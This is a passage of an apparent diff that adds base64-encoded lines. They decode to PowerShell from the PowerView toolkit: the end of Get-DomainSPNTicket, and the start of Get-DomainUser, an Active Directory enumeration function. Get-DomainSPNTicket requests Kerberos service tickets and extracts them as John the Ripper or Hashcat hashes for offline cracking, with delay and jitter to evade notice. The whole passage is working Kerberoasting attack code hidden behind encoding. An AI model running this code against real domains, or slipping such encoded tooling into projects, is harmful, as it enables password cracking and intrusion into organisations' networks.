+LURvbWFpblVzZXIpIHRvIHJlcXVlc3QgdGhlIHRpY2tldCBmb3IuDQoNCi5QQVJB
+TUVURVIgT3V0cHV0Rm9ybWF0DQoNCkVpdGhlciAnSm9obicgZm9yIEpvaG4gdGhl
+IFJpcHBlciBzdHlsZSBoYXNoIGZvcm1hdHRpbmcsIG9yICdIYXNoY2F0JyBmb3Ig
+SGFzaGNhdCBmb3JtYXQuDQpEZWZhdWx0cyB0byAnSm9obicuDQoNCi5QQVJBTUVU
+RVIgQ3JlZGVudGlhbA0KDQpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVk
+ZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzDQpmb3IgY29u
+bmVjdGlvbiB0byB0aGUgcmVtb3RlIGRvbWFpbiB1c2luZyBJbnZva2UtVXNlcklt
+cGVyc29uYXRpb24uDQoNCi5QQVJBTUVURVIgRGVsYXkNCg0KU3BlY2lmaWVzIHRo
+ZSBkZWxheSBpbiBzZWNvbmRzIGJldHdlZW4gdGlja2V0IHJlcXVlc3RzLg0KDQou
+UEFSQU1FVEVSIEppdHRlcg0KDQpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjAp
+IHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byAr
+Ly0gMC4zDQoNCi5FWEFNUExFDQoNCkdldC1Eb21haW5TUE5UaWNrZXQgLVNQTiAi
+SFRUUC93ZWIudGVzdGxhYi5sb2NhbCINCg0KUmVxdWVzdCBhIGtlcmJlcm9zIHNl
+cnZpY2UgdGlja2V0IGZvciB0aGUgc3BlY2lmaWVkIFNQTi4NCg0KLkVYQU1QTEUN
+Cg0KIkhUVFAvd2ViMS50ZXN0bGFiLmxvY2FsIiwiSFRUUC93ZWIyLnRlc3RsYWIu
+bG9jYWwiIHwgR2V0LURvbWFpblNQTlRpY2tldA0KDQpSZXF1ZXN0IGtlcmJlcm9z
+IHNlcnZpY2UgdGlja2V0cyBmb3IgYWxsIFNQTnMgcGFzc2VkIG9uIHRoZSBwaXBl
+bGluZS4NCg0KLkVYQU1QTEUNCg0KR2V0LURvbWFpblVzZXIgLVNQTiB8IEdldC1E
+b21haW5TUE5UaWNrZXQgLU91dHB1dEZvcm1hdCBIYXNoY2F0DQoNClJlcXVlc3Qg
+a2VyYmVyb3Mgc2VydmljZSB0aWNrZXRzIGZvciBhbGwgdXNlcnMgd2l0aCBub24t
+bnVsbCBTUE5zIGFuZCBvdXRwdXQgaW4gSGFzaGNhdCBmb3JtYXQuDQoNCi5JTlBV
+VFMNCg0KU3RyaW5nDQoNCkFjY2VwdHMgb25lIG9yIG1vcmUgU1BOIHN0cmluZ3Mg
+b24gdGhlIHBpcGVsaW5lIHdpdGggdGhlIFJhd1NQTiBwYXJhbWV0ZXIgc2V0Lg0K
+DQouSU5QVVRTDQoNClBvd2VyVmlldy5Vc2VyDQoNCkFjY2VwdHMgb25lIG9yIG1v
+cmUgUG93ZXJWaWV3LlVzZXIgb2JqZWN0cyBvbiB0aGUgcGlwZWxpbmUgd2l0aCB0
+aGUgVXNlciBwYXJhbWV0ZXIgc2V0Lg0KDQouT1VUUFVUUw0KDQpQb3dlclZpZXcu
+U1BOVGlja2V0DQoNCk91dHB1dHMgYSBjdXN0b20gb2JqZWN0IGNvbnRhaW5pbmcg
+dGhlIFNhbUFjY291bnROYW1lLCBTZXJ2aWNlUHJpbmNpcGFsTmFtZSwgYW5kIGVu
+Y3J5cHRlZCB0aWNrZXQgc2VjdGlvbi4NCiM+DQoNCiAgICBbT3V0cHV0VHlwZSgn
+UG93ZXJWaWV3LlNQTlRpY2tldCcpXQ0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1
+bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1Jhd1NQTicpXQ0KICAgIFBhcmFtICgNCiAg
+ICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUg
+PSAnUmF3U1BOJywgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5l
+ID0gJFRydWUpXQ0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCcuKi8uKicpXQ0K
+ICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyldDQogICAgICAg
+IFtTdHJpbmdbXV0NCiAgICAgICAgJFNQTiwNCg0KICAgICAgICBbUGFyYW1ldGVy
+KFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VyJywgTWFuZGF0
+b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQ0KICAgICAg
+ICBbVmFsaWRhdGVTY3JpcHQoeyAkXy5QU09iamVjdC5UeXBlTmFtZXNbMF0gLWVx
+ICdQb3dlclZpZXcuVXNlcicgfSldDQogICAgICAgIFtPYmplY3RbXV0NCiAgICAg
+ICAgJFVzZXIsDQoNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdKb2huJywgJ0hhc2hj
+YXQnKV0NCiAgICAgICAgW0FsaWFzKCdGb3JtYXQnKV0NCiAgICAgICAgW1N0cmlu
+Z10NCiAgICAgICAgJE91dHB1dEZvcm1hdCA9ICdKb2huJywNCg0KICAgICAgICBb
+VmFsaWRhdGVSYW5nZSgwLDEwMDAwKV0NCiAgICAgICAgW0ludF0NCiAgICAgICAg
+JERlbGF5ID0gMCwNCg0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCld
+DQogICAgICAgIFtEb3VibGVdDQogICAgICAgICRKaXR0ZXIgPSAuMywNCg0KICAg
+ICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0NCiAgICAg
+ICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCld
+DQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5Q
+U0NyZWRlbnRpYWxdOjpFbXB0eQ0KICAgICkNCg0KICAgIEJFR0lOIHsNCiAgICAg
+ICAgJE51bGwgPSBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlh
+bE5hbWUoJ1N5c3RlbS5JZGVudGl0eU1vZGVsJykNCg0KICAgICAgICBpZiAoJFBT
+Qm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsNCiAgICAgICAgICAgICRM
+b2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFs
+ICRDcmVkZW50aWFsDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBQUk9DRVNTIHsN
+CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlciddKSB7DQogICAg
+ICAgICAgICAkVGFyZ2V0T2JqZWN0ID0gJFVzZXINCiAgICAgICAgfQ0KICAgICAg
+ICBlbHNlIHsNCiAgICAgICAgICAgICRUYXJnZXRPYmplY3QgPSAkU1BODQogICAg
+ICAgIH0NCgkNCgkkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tDQoN
+CiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkVGFyZ2V0T2JqZWN0KSB7DQoN
+CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXInXSkgew0K
+ICAgICAgICAgICAgICAgICRVc2VyU1BOID0gJE9iamVjdC5TZXJ2aWNlUHJpbmNp
+cGFsTmFtZQ0KICAgICAgICAgICAgICAgICRTYW1BY2NvdW50TmFtZSA9ICRPYmpl
+Y3QuU2FtQWNjb3VudE5hbWUNCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hl
+ZE5hbWUgPSAkT2JqZWN0LkRpc3Rpbmd1aXNoZWROYW1lDQogICAgICAgICAgICB9
+DQogICAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICAgICAkVXNlclNQTiA9
+ICRPYmplY3QNCiAgICAgICAgICAgICAgICAkU2FtQWNjb3VudE5hbWUgPSAnVU5L
+Tk9XTicNCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZE5hbWUgPSAnVU5L
+Tk9XTicNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgIyBpZiBhIHVzZXIg
+aGFzIG11bHRpcGxlIFNQTnMgd2Ugb25seSB0YWtlIHRoZSBmaXJzdCBvbmUgb3Ro
+ZXJ3aXNlIHRoZSBzZXJ2aWNlIHRpY2tldCByZXF1ZXN0IGZhaWxzIG1pc2VyYWJs
+eSA6KSAtQHN0M3IzMGJ5dDMNCiAgICAgICAgICAgIGlmICgkVXNlclNQTiAtaXMg
+W1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZXN1bHRQcm9wZXJ0eVZhbHVlQ29s
+bGVjdGlvbl0pIHsNCiAgICAgICAgICAgICAgICAkVXNlclNQTiA9ICRVc2VyU1BO
+WzBdDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAg
+ICAgICAgICAgJFRpY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLklkZW50aXR5TW9k
+ZWwuVG9rZW5zLktlcmJlcm9zUmVxdWVzdG9yU2VjdXJpdHlUb2tlbiAtQXJndW1l
+bnRMaXN0ICRVc2VyU1BODQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRj
+aCB7DQogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5T
+UE5UaWNrZXRdIEVycm9yIHJlcXVlc3RpbmcgdGlja2V0IGZvciBTUE4gJyRVc2Vy
+U1BOJyBmcm9tIHVzZXIgJyREaXN0aW5ndWlzaGVkTmFtZScgOiAkXyINCiAgICAg
+ICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkVGlja2V0KSB7DQogICAgICAgICAg
+ICAgICAgJFRpY2tldEJ5dGVTdHJlYW0gPSAkVGlja2V0LkdldFJlcXVlc3QoKQ0K
+ICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRUaWNrZXRCeXRlU3RyZWFt
+KSB7DQogICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QN
+Cg0KICAgICAgICAgICAgICAgICRUaWNrZXRIZXhTdHJlYW0gPSBbU3lzdGVtLkJp
+dENvbnZlcnRlcl06OlRvU3RyaW5nKCRUaWNrZXRCeXRlU3RyZWFtKSAtcmVwbGFj
+ZSAnLScNCg0KICAgICAgICAgICAgICAgICMgVGlja2V0SGV4U3RyZWFtID09IEdT
+Uy1BUEkgRnJhbWUgKHNlZSBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZj
+NDEyMSNzZWN0aW9uLTQuMSkNCiAgICAgICAgICAgICAgICAjIE5vIGVhc3kgd2F5
+IHRvIHBhcnNlIEFTTjEsIHNvIHdlJ2xsIHRyeSBzb21lIGphbmt5IHJlZ2V4IHRv
+IHBhcnNlIHRoZSBlbWJlZGRlZCBLUkJfQVBfUkVRLlRpY2tldCBvYmplY3QNCiAg
+ICAgICAgICAgICAgICBpZigkVGlja2V0SGV4U3RyZWFtIC1tYXRjaCAnYTM4Mi4u
+Li4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4u
+QTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4u
+KyknKSB7DQogICAgICAgICAgICAgICAgICAgICRFdHlwZSA9IFtDb252ZXJ0XTo6
+VG9CeXRlKCAkTWF0Y2hlcy5FdHlwZUxlbiwgMTYgKQ0KICAgICAgICAgICAgICAg
+ICAgICAkQ2lwaGVyVGV4dExlbiA9IFtDb252ZXJ0XTo6VG9VSW50MzIoJE1hdGNo
+ZXMuQ2lwaGVyVGV4dExlbiwgMTYpLTQNCiAgICAgICAgICAgICAgICAgICAgJENp
+cGhlclRleHQgPSAkTWF0Y2hlcy5EYXRhVG9FbmQuU3Vic3RyaW5nKDAsJENpcGhl
+clRleHRMZW4qMikNCg0KICAgICAgICAgICAgICAgICAgICAjIE1ha2Ugc3VyZSB0
+aGUgbmV4dCBmaWVsZCBtYXRjaGVzIHRoZSBiZWdpbm5pbmcgb2YgdGhlIEtSQl9B
+UF9SRVEuQXV0aGVudGljYXRvciBvYmplY3QNCiAgICAgICAgICAgICAgICAgICAg
+aWYoJE1hdGNoZXMuRGF0YVRvRW5kLlN1YnN0cmluZygkQ2lwaGVyVGV4dExlbioy
+LCA0KSAtbmUgJ0E0ODInKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBXcml0
+ZS1XYXJuaW5nICdFcnJvciBwYXJzaW5nIGNpcGhlcnRleHQgZm9yIHRoZSBTUE4g
+ICQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkuIFVzZSB0aGUgVGlja2V0
+Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5l
+IHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVxIicNCiAgICAgICAgICAg
+ICAgICAgICAgICAgICRIYXNoID0gJG51bGwNCiAgICAgICAgICAgICAgICAgICAg
+ICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGlja2V0Qnl0ZUhl
+eFN0cmVhbScgKFtCaXRjb252ZXJ0ZXJdOjpUb1N0cmluZygkVGlja2V0Qnl0ZVN0
+cmVhbSkuUmVwbGFjZSgnLScsJycpKQ0KICAgICAgICAgICAgICAgICAgICB9IGVs
+c2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2ggPSAiJCgkQ2lwaGVy
+VGV4dC5TdWJzdHJpbmcoMCwzMikpYCQkKCRDaXBoZXJUZXh0LlN1YnN0cmluZygz
+MikpIg0KICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIg
+Tm90ZXByb3BlcnR5ICdUaWNrZXRCeXRlSGV4U3RyZWFtJyAkbnVsbA0KICAgICAg
+ICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAg
+ICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIHBhcnNlIHRp
+Y2tldCBzdHJ1Y3R1cmUgZm9yIHRoZSBTUE4gICQoJFRpY2tldC5TZXJ2aWNlUHJp
+bmNpcGFsTmFtZSkuIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBh
+bmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RI
+YXNoRnJvbUFQUmVxIg0KICAgICAgICAgICAgICAgICAgICAkSGFzaCA9ICRudWxs
+DQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9w
+ZXJ0eSAnVGlja2V0Qnl0ZUhleFN0cmVhbScgKFtCaXRjb252ZXJ0ZXJdOjpUb1N0
+cmluZygkVGlja2V0Qnl0ZVN0cmVhbSkuUmVwbGFjZSgnLScsJycpKQ0KICAgICAg
+ICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmKCRIYXNoKSB7DQogICAg
+ICAgICAgICAgICAgICAgIGlmICgkT3V0cHV0Rm9ybWF0IC1tYXRjaCAnSm9obicp
+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoRm9ybWF0ID0gImAka3Ji
+NXRnc2AkJCgkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lKTokSGFzaCINCiAg
+ICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsN
+CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkRGlzdGluZ3Vpc2hlZE5hbWUg
+LW5lICdVTktOT1dOJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRV
+c2VyRG9tYWluID0gJERpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkRGlzdGlu
+Z3Vpc2hlZE5hbWUuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1y
+ZXBsYWNlICcsJywnLicNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAg
+ICAgICAgICAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICRVc2VyRG9tYWluID0gJ1VOS05PV04nDQogICAgICAgICAgICAgICAg
+ICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMgaGFzaGNhdCBv
+dXRwdXQgZm9ybWF0DQogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaEZvcm1h
+dCA9ICJgJGtyYjV0Z3NgJCQoJEV0eXBlKWAkKiRTYW1BY2NvdW50TmFtZWAkJFVz
+ZXJEb21haW5gJCQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkqYCQkSGFz
+aCINCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAk
+T3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0hhc2gnICRIYXNoRm9ybWF0
+DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgJE91dCB8IEFk
+ZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTYW1BY2NvdW50TmFtZScgJFNhbUFjY291
+bnROYW1lDQogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXBy
+b3BlcnR5ICdEaXN0aW5ndWlzaGVkTmFtZScgJERpc3Rpbmd1aXNoZWROYW1lDQog
+ICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdT
+ZXJ2aWNlUHJpbmNpcGFsTmFtZScgJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFt
+ZQ0KICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2Vy
+dCgwLCAnUG93ZXJWaWV3LlNQTlRpY2tldCcpDQogICAgICAgICAgICAgICAgV3Jp
+dGUtT3V0cHV0ICRPdXQNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICMgc2xl
+ZXAgZm9yIG91ciBzZW1pLXJhbmRvbWl6ZWQgaW50ZXJ2YWwNCiAgICAgICAgICAg
+IFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSok
+RGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkNCiAgICAgICAgfQ0KICAgIH0NCg0K
+ICAgIEVORCB7DQogICAgICAgIGlmICgkTG9nb25Ub2tlbikgew0KICAgICAgICAg
+ICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4N
+CiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LURvbWFpblVzZXIg
+ew0KPCMNCi5TWU5PUFNJUw0KUmV0dXJuIGFsbCB1c2VycyBvciBzcGVjaWZpYyB1
+c2VyIG9iamVjdHMgaW4gQUQuDQpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFy
+bWoweSkgIA0KTGljZW5zZTogQlNEIDMtQ2xhdXNlICANClJlcXVpcmVkIERlcGVu
+ZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUFETmFtZSwgQ29u
+dmVydC1MREFQUHJvcGVydHkgIA0KLkRFU0NSSVBUSU9ODQpCdWlsZHMgYSBkaXJl
+Y3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwg
+YnVpbGRzIGEgY3VzdG9tDQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcv
+ZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgYWxsIG9iamVjdHMN
+Cm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMg
+cHJvcGVydGllcywgdXNlDQoiLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsdXNu
+Y2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgdXNlciBvYmplY3RzIGZvcg0K
+dGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4NCi5QQVJBTUVURVIgSWRl
+bnRpdHkNCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1
+aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixE
+Qz1sb2NhbCksDQpTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDky
+NzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4
+LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLg0KV2lsZGNhcmRzIGFjY2VwdGVkLiBB
+bHNvIGFjY2VwdHMgRE9NQUlOXHVzZXIgZm9ybWF0Lg0KLlBBUkFNRVRFUiBTUE4N
+ClN3aXRjaC4gT25seSByZXR1cm4gdXNlciBvYmplY3RzIHdpdGggbm9uLW51bGwg
+c2VydmljZSBwcmluY2lwYWwgbmFtZXMuDQouUEFSQU1FVEVSIFVBQ0ZpbHRlcg0K
+RHluYW1pYyBwYXJhbWV0ZXIgdGhhdCBhY2NlcHRzIG9uZSBvciBtb3JlIHZhbHVl
+cyBmcm9tICRVQUNFbnVtLCBpbmNsdWRpbmcNCiJOT1RfWCIgbmVnYXRpb24gZm9y
+bXMuIFRvIHNlZSBhbGwgcG9zc2libGUgdmFsdWVzLCBydW4gJzB8Q29udmVydEZy
+b20tVUFDVmFsdWUgLVNob3dBbGwnLg0KLlBBUkFNRVRFUiBBZG1pbkNvdW50DQpT
+d2l0Y2guIFJldHVybiB1c2VycyB3aXRoICcoYWRtaW5Db3VudD0xKScgKG1lYW5p
+bmcgYXJlL3dlcmUgcHJpdmlsZWdlZCkuDQouUEFSQU1FVEVSIEFsbG93RGVsZWdh
+dGlvbg0KU3dpdGNoLiBSZXR1cm4gdXNlciBhY2NvdW50cyB0aGF0IGFyZSBub3Qg
+bWFya2VkIGFzICdzZW5zaXRpdmUgYW5kIG5vdCBhbGxvd2VkIGZvciBkZWxlZ2F0
+aW9uJw0KLlBBUkFNRVRFUiBEaXNhbGxvd0RlbGVnYXRpb24NClN3aXRjaC4gUmV0
+dXJuIHVzZXIgYWNjb3VudHMgdGhhdCBhcmUgbWFya2VkIGFzICdzZW5zaXRpdmUg
+YW5kIG5vdCBhbGxvd2VkIGZvciBkZWxlZ2F0aW9uJw0KLlBBUkFNRVRFUiBUcnVz
+dGVkVG9BdXRoDQpTd2l0Y2guIFJldHVybiBjb21wdXRlciBvYmplY3RzIHRoYXQg
+YXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxz
+Lg0KLlBBUkFNRVRFUiBQcmVhdXRoTm90UmVxdWlyZWQNClN3aXRjaC4gUmV0dXJu
+IHVzZXIgYWNjb3VudHMgd2l0aCAiRG8gbm90IHJlcXVpcmUgS2VyYmVyb3MgcHJl
+YXV0aGVudGljYXRpb24iIHNldC4NCi5QQVJBTUVURVIgRG9tYWluDQpTcGVjaWZp
+ZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8g
+dGhlIGN1cnJlbnQgZG9tYWluLg0KLlBBUkFNRVRFUiBMREFQRmlsdGVyDQpTcGVj
+aWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRl
+ciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuDQouUEFSQU1FVEVSIFByb3BlcnRp
+ZXMNClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVj
+dCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuDQouUEFSQU1FVEVSIFNlYXJj
+aEJhc2UNClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAi
+TERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIg0KVXNlZnVsIGZv
+ciBPVSBxdWVyaWVzLg0KLlBBUkFNRVRFUiBTZXJ2ZXINClNwZWNpZmllcyBhbiBB
+Y3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJp
+bmQgdG8uDQouUEFSQU1FVEVSIFNlYXJjaFNjb3BlDQpTcGVjaWZpZXMgdGhlIHNj
+b3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZh
+dWx0IG9mIFN1YnRyZWUpLg0KLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQ0KU3Bl
+Y2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVy
+IG9iamVjdC4NCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0DQpTcGVjaWZpZXMg
+dGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2Vh
+cmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLg0KLlBBUkFNRVRFUiBTZWN1
+cml0eU1hc2tzDQpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2Vj
+dXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0Lg0KT25lIG9m
+ICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuDQouUEFS
+QU1FVEVSIFRvbWJzdG9uZQ0KU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2Vh
+cmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmpl
+Y3RzLg0KLlBBUkFNRVRFUiBGaW5kT25lDQpPbmx5IHJldHVybiBvbmUgcmVzdWx0
+IG9iamVjdC4NCi5QQVJBTUVURVIgQ3JlZGVudGlhbA0KQSBbTWFuYWdlbWVudC5B
+dXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVk
+ZW50aWFscw0KZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uDQou
+UEFSQU1FVEVSIFJhdw0KU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVh
+ZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmpl
+Y3QuDQouRVhBTVBMRQ0KR2V0LURvbWFpblVzZXIgLURvbWFpbiB0ZXN0bGFiLmxv
+Y2FsDQpSZXR1cm4gYWxsIHVzZXJzIGZvciB0aGUgdGVzdGxhYi5sb2NhbCBkb21h
+aW4NCi5FWEFNUExFDQpHZXQtRG9tYWluVXNlciAiUy0xLTUtMjEtODkwMTcxODU5
+LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4IiwiYWRtaW5pc3RyYXRvciINClJl
+dHVybiB0aGUgdXNlciB3aXRoIHRoZSBnaXZlbiBTSUQsIGFzIHdlbGwgYXMgQWRt
+aW5pc3RyYXRvci4NCi5FWEFNUExFDQonUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4
+MDkyNzktMzM2NjE5Njc1My0xMTE0JywgJ0NOPWRmbSxDTj1Vc2VycyxEQz10ZXN0
+bGFiLERDPWxvY2FsJywnNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBk
+MjAxJywnYWRtaW5pc3RyYXRvcicgfCBHZXQtRG9tYWluVXNlciAtUHJvcGVydGll
+cyBzYW1hY2NvdW50bmFtZSxsYXN0bG9nb2ZmDQpsYXN0bG9nb2ZmICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICBzYW1hY2NvdW50bmFtZQ0KLS0tLS0t
+LS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLS0t
+LS0tLS0NCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAgICAgICAg
+ICAgIGRmbS5hDQoxMi8zMS8xNjAwIDQ6MDA6MDAgUE0gICAgICAgICAgICAgICAg
+ICAgICAgICBkZm0NCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAg
+ICAgICAgICAgIGhhcm1qMHkNCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAg
+ICAgICAgICAgICAgICAgIEFkbWluaXN0cmF0b3INCi5FWEFNUExFDQpHZXQtRG9t
+YWluVXNlciAtU2VhcmNoQmFzZSAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFi
